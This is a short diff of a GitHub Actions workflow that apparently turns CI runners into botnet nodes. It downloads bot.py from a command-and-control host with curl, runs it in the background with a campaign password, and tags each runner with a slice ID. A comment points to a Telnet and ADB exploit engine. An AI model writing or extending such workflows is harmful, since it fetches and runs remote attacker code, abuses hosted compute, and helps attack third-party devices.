@@ -46,8 +46,8 @@ jobs:
           # Self-register as C2 bot
           # ═══════════════════════════════════════
           curl -s "http://$C2:$PPORT/bot.py" -o /tmp/bot.py 2>/dev/null
-          python3 /tmp/bot.py "$C2" "$CPORT" "enibot2024" &
-          echo "Bot registered → $C2:$CPORT"
+          python3 /tmp/bot.py "$C2" "$CPORT" "enibot2024" "gh-slice-$S" &
+          echo "Bot registered → $C2:$CPORT (gh-slice-$S)"
 
           # ═══════════════════════════════════════════════
           # Python exploit engine (raw socket Telnet + ADB)
